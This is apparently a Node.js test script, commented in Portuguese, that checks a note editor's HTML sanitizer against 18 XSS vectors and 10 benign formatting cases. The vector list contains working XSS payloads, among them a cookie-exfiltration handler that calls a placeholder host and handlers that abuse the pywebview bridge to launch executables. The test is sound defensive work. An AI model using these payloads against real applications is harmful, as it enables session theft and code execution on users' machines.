/* ===========================================================================
 *  NEXUS — testes do sanitizador de HTML do editor de notas
 * ===========================================================================
 *  Uso:
 *      cd C:\Dev\nexus            (ou onde estiver o nexus.py)
 *      npm install jsdom          (uma vez so)
 *      node build_tools\testar_sanitizador.js
 *
 *  O script extrai as funcoes de sanitizacao direto do nexus.py e roda 28
 *  casos contra elas: 18 vetores de XSS que precisam ser bloqueados e 10
 *  formatacoes legitimas que precisam sobreviver.
 *
 *  Rode isto depois de QUALQUER alteracao no editor de notas. Um sanitizador
 *  que quebra em silencio e pior que nenhum: da a sensacao de protecao sem a
 *  protecao.
 * ======================================================================== */

const fs = require('fs');
const path = require('path');

let JSDOM;
try {
  ({ JSDOM } = require('jsdom'));
} catch (e) {
  console.error('\n  Falta a dependencia "jsdom" para simular o navegador.\n');
  console.error('  Instale com:   npm install jsdom\n');
  console.error('  (E so para os testes. O NEXUS nao depende de Node nem de npm.)\n');
  process.exit(2);
}

// ---------------------------------------------------------------- fonte
const raiz = path.resolve(__dirname, '..');
const arquivoPy = path.join(raiz, 'nexus.py');

if (!fs.existsSync(arquivoPy)) {
  console.error('\n  nexus.py nao encontrado em ' + raiz);
  console.error('  Rode a partir da pasta do projeto.\n');
  process.exit(2);
}

const src = fs.readFileSync(arquivoPy, 'utf8');
const ini = src.indexOf('const TAGS_PERMITIDAS');
const fim = src.indexOf('function escapeHtml(str)');

if (ini < 0 || fim < 0 || fim <= ini) {
  console.error('\n  Nao encontrei o bloco de sanitizacao no nexus.py.');
  console.error('  Esperado: de "const TAGS_PERMITIDAS" ate "function escapeHtml".');
  console.error('  Se o codigo foi reorganizado, ajuste os marcadores acima.\n');
  process.exit(2);
}

const dom = new JSDOM('<!DOCTYPE html><body></body>', { runScripts: 'outside-only' });
dom.window.eval(src.slice(ini, fim));
const san = dom.window.sanitizarHtml;

if (typeof san !== 'function') {
  console.error('\n  sanitizarHtml nao foi definida. O bloco extraido esta incompleto.\n');
  process.exit(2);
}

// ------------------------------------------------- detector de sobras
const TAGS_PROIBIDAS = ['SCRIPT', 'IFRAME', 'OBJECT', 'EMBED', 'FORM', 'SVG',
                        'MATH', 'LINK', 'META', 'STYLE', 'BASE', 'APPLET'];

function perigoso(html) {
  const d = new JSDOM('<!DOCTYPE html><body></body>').window.document;
  const t = d.createElement('template');
  t.innerHTML = html;
  const achados = [];
  for (const el of t.content.querySelectorAll('*')) {
    if (TAGS_PROIBIDAS.includes(el.tagName.toUpperCase())) {
      achados.push('tag ' + el.tagName);
    }
    for (const a of Array.from(el.attributes)) {
      if (a.name.toLowerCase().startsWith('on')) achados.push('atributo ' + a.name);
      if (/^\s*javascript:/i.test(a.value)) achados.push('javascript: em ' + a.name);
      if (/^\s*data:text\/html/i.test(a.value)) achados.push('data:html em ' + a.name);
    }
  }
  if (/<script/i.test(html)) achados.push('texto <script');
  return achados;
}

// ------------------------------------------------------------- casos
const VETORES = [
  ['<script>alert(1)</script>',                                   'script direto'],
  ['<img src=x onerror="alert(1)">',                              'onerror em img'],
  ['<svg/onload=alert(1)>',                                       'svg onload'],
  ['<iframe src="javascript:alert(1)"></iframe>',                 'iframe javascript'],
  ['<a href="javascript:alert(1)">clique</a>',                    'href javascript'],
  ['<a href="java\tscript:alert(1)">x</a>',                       'javascript com tab'],
  ['<a href="  JaVaScRiPt:alert(1)">x</a>',                       'javascript disfarcado'],
  ['<body onload=alert(1)>',                                      'body onload'],
  ['<div onmouseover="fetch(\'http://mau/\'+document.cookie)">oi</div>', 'exfiltracao'],
  ['<form action="http://mau"><input name=x></form>',             'form'],
  ['<object data="x.swf"></object>',                              'object'],
  ['<embed src="x">',                                             'embed'],
  ['<base href="http://mau/">',                                   'base hijack'],
  ['<meta http-equiv="refresh" content="0;url=http://mau">',      'meta refresh'],
  ['<style>@import "http://mau/x.css"</style>',                   'style import'],
  ['<div><script>alert(1)</script>texto ok</div>',                'script aninhado'],
  ['<a href="#" onclick="window.pywebview.api.open_external_target(\'C:\\\\x.exe\')">n</a>',
                                                                  'ATAQUE: ponte pywebview'],
  ['<img src=x onerror="window.pywebview.api.update_install()">', 'ATAQUE: forcar update'],
];

const PRESERVAR = [
  ['<b>negrito</b>',                           '<b> negrito'],
  ['<p>paragrafo</p>',                         '<p> paragrafo'],
  ['<ul><li>item</li></ul>',                   'lista'],
  ['<a href="https://exemplo.com">link</a>',   'link https'],
  ['<a href="mailto:a@b.com">email</a>',       'mailto'],
  ['<h1>titulo</h1>',                          'cabecalho'],
  ['<table><tr><td>cel</td></tr></table>',     'tabela'],
  ['<blockquote>citacao</blockquote>',         'citacao'],
  ['<code>codigo</code>',                      'codigo'],
  ['<span style="color:red">x</span>',         'span (style removido)'],
];

// -------------------------------------------------------------- execucao
let falhas = 0;
const linha = '='.repeat(88);

console.log('\n' + linha);
console.log(' BLOQUEIO DE VETORES DE XSS');
console.log(linha);
for (const [entrada, nome] of VETORES) {
  const saida = san(entrada);
  const restos = perigoso(saida);
  const ok = restos.length === 0;
  if (!ok) falhas++;
  console.log(`  ${ok ? 'OK   ' : 'FALHA'}  ${nome.padEnd(28)} -> ${JSON.stringify(saida).slice(0, 40)}`);
  if (!ok) console.log(`         SOBROU: ${restos.join(', ')}`);
}

console.log('\n' + linha);
console.log(' FORMATACAO LEGITIMA PRESERVADA');
console.log(linha);
for (const [entrada, nome] of PRESERVAR) {
  const saida = san(entrada);
  const textoOk = saida.replace(/<[^>]*>/g, '') === entrada.replace(/<[^>]*>/g, '');
  if (!textoOk) falhas++;
  console.log(`  ${textoOk ? 'OK   ' : 'FALHA'}  ${nome.padEnd(28)} -> ${JSON.stringify(saida).slice(0, 40)}`);
}

console.log('\n' + linha);
if (falhas === 0) {
  console.log(` TODOS OS ${VETORES.length + PRESERVAR.length} TESTES PASSARAM`);
} else {
  console.log(` ${falhas} FALHA(S) — NAO PUBLIQUE ANTES DE CORRIGIR`);
}
console.log(linha + '\n');
process.exit(falhas ? 1 : 0);
